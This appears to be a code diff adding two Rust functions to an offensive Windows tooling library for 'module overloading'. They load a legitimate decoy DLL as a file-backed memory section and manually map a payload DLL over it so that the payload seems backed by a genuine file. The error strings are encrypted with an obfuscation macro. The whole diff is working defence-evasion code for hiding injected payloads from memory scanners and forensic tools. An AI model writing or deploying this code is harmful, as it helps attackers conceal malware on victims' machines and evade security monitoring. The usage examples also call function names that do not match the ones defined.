@@ -218,3 +218,90 @@ pub fn overload_to_section (file_content: Vec<u8>, section_metadata: PeManualMap
         Ok((pe_info, *base_address as i64))
     }
 }
+
+/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
+/// Afterwards overload that module by manually mapping a payload (from disk) that will appear to be file-backed  
+/// by the legitimate decoy module.
+///
+/// It will return either a pair ((Vec<u8>,Vec<u8>),i64) containing the mapped PE's (payload)
+/// content, the decoy module's content and the base payload base address or a string with a descriptive error messsage.
+///
+/// # Examples
+///
+/// ```
+/// let module = overload::read_and_overload("c:\\temp\\payload.dll","");
+///
+/// match module {
+///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
+///     Err(e) => println!("Error ocurred: {}", e),      
+/// }
+/// ```
+pub fn managed_read_and_overload (payload_path: &str, decoy_module_path: &str) -> Result<((Vec<u8>,Vec<u8>),i64), String>
+{
+
+    if !Path::new(payload_path).is_file()
+    {
+        return Err(lc!("[x] Payload file not found."));
+    }
+
+
+    let file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
+    let result = managed_overload_module(file_content.clone(), decoy_module_path)?;
+
+    Ok(((file_content, result.0), result.1))
+}
+
+/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
+/// Afterwards overload that module by manually mapping a payload (from memory) that will appear to be file-backed 
+/// by the legitimate decoy module.
+///
+/// It will return either a pair (Vec<u8>,i64) containing the decoy content and the payload base address or a string
+/// with a descriptive error message.
+///
+/// # Examples
+///
+/// ```
+/// use std::fs;
+///
+/// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
+/// let module = overload::overload_module(payload_content,"");
+///
+/// match module {
+///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
+///     Err(e) => println!("Error ocurred: {}", e),      
+/// }
+/// ```
+pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) -> Result<(Vec<u8>,i64), String> 
+{   
+    let mut decoy_module_path = decoy_module_path.to_string();
+    let decoy_content;
+    
+    if decoy_module_path != ""
+    {
+        if !Path::new(&decoy_module_path).is_file()
+        {
+            return Err(lc!("[x] Decoy file not found."));
+        }
+        
+        decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));
+        if decoy_content.len() < file_content.len()
+        {
+            return Err(lc!("[x] Decoy module is too small to host the payload."));
+        }
+    }
+    else
+    {
+        decoy_module_path = find_decoy_module(file_content.len() as i64);
+        if decoy_module_path == ""
+        {
+            return Err(lc!("[x] Failed to find suitable decoy module."));
+        }
+        decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));        
+    }
+
+        let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;
+
+        let result: (PeMetadata,i64) = overload_to_section(file_content, decoy_metadata.0)?;
+
+        Ok((decoy_content, result.1))
+}
